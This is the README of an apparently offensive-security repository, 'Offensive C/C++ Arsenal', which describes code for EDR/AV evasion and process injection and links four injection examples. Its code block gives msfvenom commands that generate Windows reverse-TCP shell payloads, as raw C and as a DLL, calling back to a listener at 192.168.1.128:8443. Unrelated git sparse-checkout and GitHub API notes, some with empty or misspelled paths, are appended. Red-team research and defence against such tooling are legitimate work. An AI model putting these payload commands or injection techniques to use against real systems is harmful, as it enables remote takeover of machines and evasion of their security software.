# Offensive C/C++ Arsenal

This repository is a comprehensive collection of low-level C and C++ source codes, used by Red Teamers, APTs (Advanced Persistent Threats), and modern malware. 

The primary focus is on **stealth**, **EDR/AV evasion**, **process manipulation**, and **cryptography**. All implementations are designed to be educational, modular, and adaptable for offensive security research and red team operations.

---
## Fundamentals
A collection of examples intended to demonstrate the fundamentals and provide a base for more advanced techniques.  
* [injection-example-1.c](/fundamentals/injection-example-1.c): injecting current process 
* [injection-example-2.c](/fundamentals/injection-example-2.c): injecting toggling the memory protection between RW and RWX
* [injection-example-3.c](/fundamentals/injection-example-3.c): injecting remote process, with memory protection toggling
* [injection-example-4.c](/fundamentals/injection-example-4.c): injecting remote process, toggling and DFR


```

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.128 LPORT=8443 -f c
// dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.128 LPORT=8443 -f dll -o mylib.dll


git clone --filter=blob:none --no-checkout https://github.com/USER/REPO.git
cd REPO

git sparse-checkout init --cone
git sparse-checkout set path/to/folder

git checkout


gh api repos//git/trees/main?recursive=1   --jq '.tree[].path' | rg "smippets"

gh api repos///git/trees/main?recursive=1   --jq '.tree[].path' | rg ""


```
